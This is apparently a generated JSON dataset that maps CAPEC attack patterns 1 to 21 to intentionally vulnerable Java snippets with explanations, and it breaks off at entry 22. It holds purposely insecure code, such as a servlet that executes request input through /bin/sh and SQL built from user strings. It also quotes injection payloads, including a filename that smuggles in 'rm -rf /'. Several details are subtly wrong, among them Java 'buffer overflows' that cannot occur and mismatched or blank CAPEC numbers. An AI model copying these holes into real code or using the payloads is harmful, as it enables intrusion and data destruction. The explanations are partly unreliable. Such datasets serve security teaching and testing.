[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Missing authorization check\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}\n",
        "description": "This Java code snippet defines a servlet mapped to the '/admin' URL. The servlet's doGet method responds with a message indicating access to the admin panel. However, it lacks an authorization check, allowing any user to access this functionality. This embodies the main idea of the CAPEC 'Accessing Functionality Not Properly Constrained by ACLs' by demonstrating how an attacker could access sensitive functionality due to missing access control. The related CWEs provide additional context, such as CWE-285 (Improper Authorization) and CWE-276 (Incorrect Default Permissions), highlighting the importance of proper authorization checks and secure default configurations."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AccountLockout {\n    private static final int MAX_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, Boolean> accountLocked = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        if (accountLocked.getOrDefault(username, false)) {\n            System.out.println(\"Account is locked.\");\n            return false;\n        }\n\n        if (authenticate(username, password)) {\n            loginAttempts.put(username, 0); // reset attempts on successful login\n            return true;\n        } else {\n            int attempts = loginAttempts.getOrDefault(username, 0) + 1;\n            loginAttempts.put(username, attempts);\n            if (attempts >= MAX_ATTEMPTS) {\n                accountLocked.put(username, true);\n                System.out.println(\"Account locked due to too many failed attempts.\");\n            }\n            return false;\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Dummy authentication logic\n        return \"password123\".equals(password);\n    }\n\n    public static void main(String[] args) {\n        AccountLockout system = new AccountLockout();\n        system.login(\"user1\", \"wrongpassword\");\n        system.login(\"user1\", \"wrongpassword\");\n        system.login(\"user1\", \"wrongpassword\");\n        system.login(\"user1\", \"password123\"); // This will fail because the account is locked\n    }\n}",
        "description": "This Java code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The code defines a simple login system where an account is locked after three failed login attempts. The `login` method checks if the account is locked before attempting authentication. If the account is not locked, it proceeds to authenticate the user. If authentication fails, it increments the failed attempt count and locks the account if the maximum number of attempts is reached. This mechanism can be exploited by an attacker to lock out legitimate users by repeatedly attempting to log in with incorrect passwords. The code also highlights related weaknesses such as weak password requirements and improper restriction of excessive authentication attempts."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class InputFilterBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u200B\\u200C\\u200Dadmin\"; // Leading ghost characters (Zero Width Space, Zero Width Non-Joiner, Zero Width Joiner)\n        String filteredInput = filterInput(userInput);\n        if (isValidUser(filteredInput)) {\n            System.out.println(\"Access granted to user: \" + filteredInput);\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static String filterInput(String input) {\n        // Filter out non-alphanumeric characters\n        return input.replaceAll(\"[^a-zA-Z0-9]\", \"\");\n    }\n\n    public static boolean isValidUser(String username) {\n        // Check if the username is 'admin'\n        return \"admin\".equals(username);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where leading 'ghost' characters (invisible Unicode characters) are used to bypass input filters. The `filterInput` method attempts to sanitize the input by removing non-alphanumeric characters. However, it does not account for leading ghost characters like Zero Width Space (\\u200B), Zero Width Non-Joiner (\\u200C), and Zero Width Joiner (\\u200D). These characters are stripped out by the filter, allowing the input 'admin' to pass through and be validated as a legitimate user. This example embodies the CAPEC concept of using leading ghost characters to bypass input filters and highlights related CWEs such as improper handling of alternate encoding (CWE-173), improper input validation (CWE-20), and incorrect behavior order (CWE-180)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.regex.Pattern;\n\npublic class IPAddressValidator {\n    private static final Pattern IP_PATTERN = Pattern.compile(\n            \"^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\");\n\n    public static boolean isValidIP(String ip) {\n        return IP_PATTERN.matcher(ip).matches();\n    }\n\n    public static boolean isTrustedIP(String ip) {\n        if (!isValidIP(ip)) {\n            return false;\n        }\n        try {\n            InetAddress inetAddress = InetAddress.getByName(ip);\n            String hostname = inetAddress.getHostName();\n            InetAddress[] addresses = InetAddress.getAllByName(hostname);\n            for (InetAddress addr : addresses) {\n                if (addr.getHostAddress().equals(ip)) {\n                    return true;\n                }\n            }\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String ip = \"192.168.1.1\";\n        if (isTrustedIP(ip)) {\n            System.out.println(\"IP is trusted.\");\n        } else {\n            System.out.println(\"IP is not trusted.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic IP address validation and trust check mechanism. The `isValidIP` method uses a regex pattern to ensure the IP address is in the standard dotted-decimal format. The `isTrustedIP` method performs a reverse DNS lookup to get the hostname associated with the IP address and then resolves the hostname back to an IP address to verify the association. This approach aims to mitigate issues related to CWE-291 (Reliance on IP Address for Authentication) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action). However, it does not handle alternative IP address encodings, making it vulnerable to the CAPEC-170 attack (Using Alternative IP Address Encodings)."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class BlueBoxingExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 12345);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            // Simulating sending a supervisor signal tone\n            String supervisorSignal = \"2600Hz\";\n            out.println(supervisorSignal);\n\n            // CWE-285: Improper Authorization\n            // Assuming the signal reroutes the line without proper authorization\n            String response = in.readLine();\n            System.out.println(\"Response: \" + response);\n\n            // CWE-294: Authentication Bypass by Capture-replay\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            // Simulating replay attack\n            out.println(supervisorSignal);\n            response = in.readLine();\n            System.out.println(\"Replay Response: \" + response);\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Blue Boxing attack. The code establishes a socket connection to a server and sends a 'supervisor signal' tone, represented by the string '2600Hz'. This tone is intended to simulate the unauthorized rerouting of a telephone line, exploiting improper authorization (CWE-285) and improper verification of the communication channel's source (CWE-940). The code also simulates a replay attack (CWE-294) by sending the same signal again, highlighting the lack of message integrity enforcement (CWE-924) and improper restriction of communication channels to intended endpoints (CWE-923). This example illustrates the vulnerabilities that can arise from inadequate security measures in communication systems."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import java.io.*;\n\npublic class ArgumentInjectionExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java ArgumentInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // Vulnerable code: Improper Neutralization of Special Elements used in an OS Command\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Argument Injection vulnerability. The program takes a filename as a command-line argument and constructs an OS command to display the contents of the file using the 'cat' command. The filename is directly concatenated into the command string without any validation or neutralization of special characters. This can lead to an OS Command Injection (CWE-78) if an attacker provides a malicious filename containing special characters or command delimiters. For example, an attacker could provide a filename like 'file.txt; rm -rf /' to execute arbitrary commands. This snippet embodies the main idea of CAPEC-138 (Argument Injection) by showing how unvalidated and unfiltered arguments can change the behavior of the application."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\nimport java.util.Scanner;\n\npublic class BlindSQLInjectionExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter user ID: \");\n        String userId = scanner.nextLine();\n\n        try {\n            Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n            Statement statement = connection.createStatement();\n\n            // Vulnerable SQL query\n            String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (resultSet.next()) {\n                System.out.println(\"User found.\");\n            } else {\n                System.out.println(\"User not found.\");\n            }\n\n            resultSet.close();\n            statement.close();\n            connection.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a Blind SQL Injection vulnerability. The code takes user input for a user ID and constructs an SQL query without proper input validation or neutralization of special elements. This allows an attacker to inject SQL code through the user input. For example, entering '1' OR '1'='1' as the user ID would always return true, potentially exposing sensitive information. The code represents the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import java.nio.ByteBuffer;\n\npublic class VulnerableLibrary {\n    public void vulnerableMethod(byte[] input) {\n        // CWE-120: Buffer Copy without Checking Size of Input\n        byte[] buffer = new byte[10];\n        System.arraycopy(input, 0, buffer, 0, input.length);\n    }\n\n    public static void main(String[] args) {\n        VulnerableLibrary lib = new VulnerableLibrary();\n        byte[] largeInput = new byte[20]; // Input larger than buffer size\n        lib.vulnerableMethod(largeInput); // This will cause a buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability in an API call, aligning with the CAPEC description. The `vulnerableMethod` method in the `VulnerableLibrary` class copies an input byte array to a fixed-size buffer without checking if the input size exceeds the buffer size (CWE-120). This can lead to a buffer overflow if the input array is larger than the buffer, as shown in the `main` method where a 20-byte array is passed to a method that only allocates a 10-byte buffer. This example highlights the risk of using vulnerable libraries or shared code modules, which can affect all clients using the library."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCommandLineUtility {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        char[] buffer = new char[256];\n        try {\n            System.out.print(\"Enter command: \");\n            int charsRead = reader.read(buffer);\n            if (charsRead > 0) {\n                String command = new String(buffer, 0, charsRead);\n                Runtime.getRuntime().exec(command);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable command-line utility that reads user input and executes it as a system command. The code is vulnerable to several weaknesses described in the CAPEC and related CWEs:\n\n1. **Buffer Overflow (CWE-120, CWE-119)**: The code reads user input into a fixed-size buffer without checking if the input exceeds the buffer size, potentially leading to a buffer overflow.\n2. **Improper Input Validation (CWE-20)**: The code does not validate the user input before executing it as a command, allowing for potential injection attacks.\n3. **Injection (CWE-74)**: The code directly uses user input to construct a command for execution, which can be exploited by an attacker to execute arbitrary commands.\n\nThe main idea of the CAPEC is to demonstrate how an adversary can exploit vulnerabilities in command-line utilities to escalate privileges, and this code snippet embodies that by showing how improper handling of user input can lead to serious security issues."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // Get environment variable\n        String userInput = System.getenv(\"USER_INPUT\");\n        \n        // Vulnerable buffer copy without checking size\n        char[] buffer = new char[10];\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120: Buffer Copy without Checking Size of Input\n        }\n        \n        // Print the buffer content\n        System.out.println(buffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via environment variables, aligning with the CAPEC description. The code retrieves an environment variable 'USER_INPUT' and copies its content into a fixed-size buffer without checking the size of the input. This can lead to a buffer overflow if the environment variable's value exceeds the buffer's capacity. The code embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) by not validating the length of 'userInput' before copying it into 'buffer'. This example highlights the implicit trust placed in environment variables and the potential security risks associated with it."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String fileExtension = getFileExtension(fileName);\n\n        // Vulnerable code: relying on file extension to determine file type\n        if (fileExtension.equals(\"txt\")) {\n            processTextFile(filePart);\n        } else if (fileExtension.equals(\"jpg\")) {\n            processImageFile(filePart);\n        } else {\n            response.getWriter().println(\"Unsupported file type.\");\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n\n    private String getFileExtension(String fileName) {\n        if (fileName != null && fileName.contains(\".\")) {\n            return fileName.substring(fileName.lastIndexOf('.') + 1);\n        }\n        return \"\";\n    }\n\n    private void processTextFile(Part filePart) throws IOException {\n        // Process text file\n        InputStream fileContent = filePart.getInputStream();\n        // ...\n    }\n\n    private void processImageFile(Part filePart) throws IOException {\n        // Process image file\n        InputStream fileContent = filePart.getInputStream();\n        // ...\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload mechanism that relies on the file extension to determine how to process the uploaded file. The `doPost` method handles file uploads by extracting the file name and its extension. Based on the extension, it decides whether to process the file as a text file or an image file. This approach is vulnerable to attacks where an attacker can upload a file with a misleading extension, causing the server to misclassify and improperly handle the file. This can lead to various security issues such as resource exhaustion, exposure of sensitive data, or execution of unintended actions. The code embodies the main idea of CAPEC-430 and related CWEs by demonstrating the risks of relying on file extensions for determining file handling behavior."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class MessageHandler {\n    private static final Map<String, String> messageIdentifiers = new HashMap<>();\n\n    static {\n        // Simulated message identifiers for clients\n        messageIdentifiers.put(\"client1\", \"msg123\");\n        messageIdentifiers.put(\"client2\", \"msg456\");\n    }\n\n    public static void main(String[] args) {\n        String receivedMessage = \"msg123\"; // Simulated received message\n        String clientId = \"client2\"; // Simulated client ID\n\n        // Vulnerable code: No authentication or integrity check\n        if (messageIdentifiers.containsValue(receivedMessage)) {\n            System.out.println(\"Message for client: \" + clientId);\n            // Process the message as if it was intended for the client\n        } else {\n            System.out.println(\"Invalid message identifier\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable message handling system where messages are identified by simple identifiers. The `messageIdentifiers` map simulates a set of message identifiers assigned to clients. The `main` method simulates receiving a message and a client ID. The code checks if the received message identifier exists in the map but does not verify if it is intended for the specific client, nor does it perform any authentication or integrity checks. This vulnerability can be exploited by an attacker to impersonate another client by choosing a valid message identifier, thus gaining unauthorized access to potentially privileged information. This example embodies the CAPEC 'Choosing Message Identifier' and highlights related CWEs such as missing authentication (CWE-306) and improper enforcement of message integrity (CWE-924)."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws IOException {\n        // CWE-15: External Control of System or Configuration Setting\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"/default/config/path\";\n        }\n        \n        // CWE-73: External Control of File Name or Path\n        java.nio.file.Path path = java.nio.file.Paths.get(configPath);\n        java.nio.file.Files.lines(path).forEach(System.out::println);\n        \n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        String userRole = System.getenv(\"USER_ROLE\");\n        if (\"admin\".equals(userRole)) {\n            System.out.println(\"Access granted to admin functionality.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that reads configuration and user role information from environment variables. The main idea of the CAPEC is embodied by the manipulation of environment variables to subvert the application's expected behavior. The code includes several related CWEs:\n\n1. CWE-15: External Control of System or Configuration Setting - The application reads the CONFIG_PATH environment variable to determine the configuration file path, which can be manipulated by an attacker.\n2. CWE-73: External Control of File Name or Path - The application uses the CONFIG_PATH environment variable to construct a file path, which can lead to unauthorized file access if the variable is manipulated.\n3. CWE-302: Authentication Bypass by Assumed-Immutable Data - The application checks the USER_ROLE environment variable to grant or deny access to admin functionality, which can be bypassed if the variable is manipulated.\n\nThis code snippet highlights the risks associated with relying on environment variables for critical configuration and authorization decisions without proper validation and integrity checks."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious.example.com\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            char[] buffer = new char[256];\n            int charsRead;\n            while ((charsRead = in.read(buffer)) != -1) {\n                // CWE-120: Buffer Copy without Checking Size of Input\n                char[] data = new char[charsRead];\n                System.arraycopy(buffer, 0, data, 0, charsRead);\n                processData(data);\n            }\n            in.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processData(char[] data) {\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        char[] smallBuffer = new char[10];\n        for (int i = 0; i < data.length; i++) {\n            // CWE-118: Incorrect Access of Indexable Resource\n            smallBuffer[i] = data[i]; // Potential buffer overflow\n        }\n        System.out.println(smallBuffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a client-side buffer overflow vulnerability by fetching data from a malicious URL and processing it without proper input validation. The main idea of the CAPEC is represented by the `VulnerableClient` class, which reads data from a potentially hostile service and processes it in a way that can lead to a buffer overflow. The code includes several related CWEs: CWE-120 (Buffer Copy without Checking Size of Input) is demonstrated by copying data from the buffer without verifying its size, CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) is shown by writing data to a smaller buffer, and CWE-118 (Incorrect Access of Indexable Resource) is illustrated by accessing the buffer without proper bounds checking. This code is vulnerable to buffer overflow attacks, which can be exploited by an attacker to execute arbitrary code or cause a denial of service."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a filename: \");\n            String filename = reader.readLine();\n\n            // Vulnerable code: concatenating user input directly into the command\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program reads a filename from user input and directly concatenates it into a shell command (`cat <filename>`). This approach is vulnerable to command injection attacks because an attacker can input a filename containing shell command delimiters (e.g., `;`, `&&`, `|`) to execute arbitrary commands. For example, entering `file.txt; rm -rf /` would delete the root directory. This code embodies the main idea of CAPEC-88 (Command Delimiters) and is related to several CWEs, including CWE-77 (Command Injection), CWE-78 (OS Command Injection), and CWE-140 (Improper Neutralization of Delimiters)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class DictionaryAttackExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static String[] dictionary = {\"password\", \"123456\", \"qwerty\", \"abc123\", \"letmein\"};\n\n    public static void main(String[] args) {\n        // Initialize user database with weak passwords\n        userDatabase.put(\"user1\", \"password\");\n        userDatabase.put(\"user2\", \"123456\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return false;\n        }\n        String storedPassword = userDatabase.get(username);\n        for (String dictWord : dictionary) {\n            if (storedPassword.equals(dictWord)) {\n                return storedPassword.equals(password);\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a simple dictionary-based password attack scenario. The code initializes a user database with weak passwords and uses a predefined dictionary of common passwords. When a user attempts to log in, the code checks if the entered password matches any of the weak passwords in the dictionary. If a match is found, access is granted. This example highlights several weaknesses: weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and improper restriction of excessive authentication attempts (CWE-307). The code does not implement any measures to prevent multiple failed authentication attempts, making it susceptible to brute force attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.util.Set;\n\npublic class MaliciousFileExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            Path filePath = Paths.get(\"/tmp/uploadedFile.sh\");\n            Set<PosixFilePermission> permissions = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(filePath, permissions);\n\n            // CWE-285: Improper Authorization\n            if (isAuthorizedUser()) {\n                // CWE-272: Least Privilege Violation\n                executeFile(filePath);\n            } else {\n                System.out.println(\"Unauthorized access attempt detected.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isAuthorizedUser() {\n        // Simulate an authorization check\n        return true; // Insecure: Always returns true\n    }\n\n    private static void executeFile(Path filePath) throws IOException {\n        // CWE-270: Privilege Context Switching Error\n        ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", filePath.toString());\n        pb.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a system is vulnerable to attacks involving malicious files. The code allows an uploaded file to be executed with incorrect permissions (CWE-732), performs an improper authorization check (CWE-285), and violates the principle of least privilege (CWE-272). The file is given full read, write, and execute permissions, which can be exploited by an attacker. The authorization check is insecure as it always returns true, allowing any user to execute the file. Additionally, the code does not properly manage privileges when executing the file (CWE-270), potentially leading to privilege escalation. This example highlights the importance of proper permission assignment, secure authorization checks, and adherence to the principle of least privilege to prevent such vulnerabilities."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'XSS Targeting Non-Script Elements' (CAPEC-). The servlet takes user input from a request parameter and directly embeds it into an IMG tag's src attribute without proper validation or sanitization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker provides a malicious script as the input. The code snippet embodies CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page), and CWE-79 (Improper Neutralization of Input During Web Page Generation). The vulnerability arises because the application does not neutralize special characters in the user input, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String script = request.getParameter(\"script\");\n        if (script != null) {\n            try {\n                ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", script);\n                Process p = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            } catch (IOException e) {\n                response.getWriter().println(\"Error executing script\");\n            }\n        } else {\n            response.getWriter().println(\"No script provided\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where an attacker can embed and execute their own script within the server's environment. The servlet takes a 'script' parameter from the HTTP request and executes it using a shell command. This represents the CAPEC 'Embedding Scripts within Scripts' by allowing remote execution of potentially malicious scripts. The code also embodies CWE-284 (Improper Access Control) by not restricting access to the script execution functionality, CWE-79 (Cross-site Scripting) by potentially allowing script injection in the response, and CWE-506 (Embedded Malicious Code) by executing untrusted code. This example highlights the risks of executing user-provided input without proper validation and access control."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class WeakEncryptionExample {\n    private static final String ALGORITHM = \"AES\";\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // CWE-321: Use of Hard-coded Cryptographic Key\n\n    public static void main(String[] args) {\n        try {\n            String plaintext = \"SensitiveData\";\n            String encryptedText = encrypt(plaintext, HARD_CODED_KEY);\n            System.out.println(\"Encrypted Text: \" + encryptedText);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String encrypt(String data, String key) throws Exception {\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a weak encryption implementation that is vulnerable to brute force attacks. The code uses AES encryption with a hard-coded cryptographic key (CWE-321), which significantly increases the risk of the key being discovered through brute force methods. The encryption algorithm used (AES) is theoretically sound, but the use of a hard-coded key and potentially inadequate key length (CWE-326) makes the encryption strength insufficient for protecting sensitive data. This example embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by showing how an attacker could potentially decrypt the cipher text by brute-forcing the hard-coded key."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        Cookie sessionCookie = new Cookie(\"sessionID\", \"123456\");\n        sessionCookie.setMaxAge(60 * 60 * 24 * 30); // 30 days\n        response.addCookie(sessionCookie);\n\n        // CWE-384: Session Fixation\n        String sessionID = request.getParameter(\"sessionID\");\n        if (sessionID != null) {\n            request.getSession().setAttribute(\"sessionID\", sessionID);\n        }\n\n        // CWE-642: External Control of Critical State Data\n        String userRole = request.getParameter(\"role\");\n        if (userRole != null) {\n            request.getSession().setAttribute(\"role\", userRole);\n        }\n\n        response.getWriter().println(\"Session ID: \" + request.getSession().getAttribute(\"sessionID\"));\n        response.getWriter().println(\"User Role: \" + request.getSession().getAttribute(\"role\"));\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the exploitation of trusted identifiers. The code sets a persistent cookie containing a sensitive session ID (CWE-539), which can be easily guessed or obtained by an attacker. It also allows session fixation (CWE-384) by accepting a session ID from a request parameter and setting it directly in the session without validation. Additionally, it allows external control of critical state data (CWE-642) by accepting a user role from a request parameter and storing it in the session. These vulnerabilities can be exploited by an adversary to perform authorized actions under the guise of an authenticated user, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
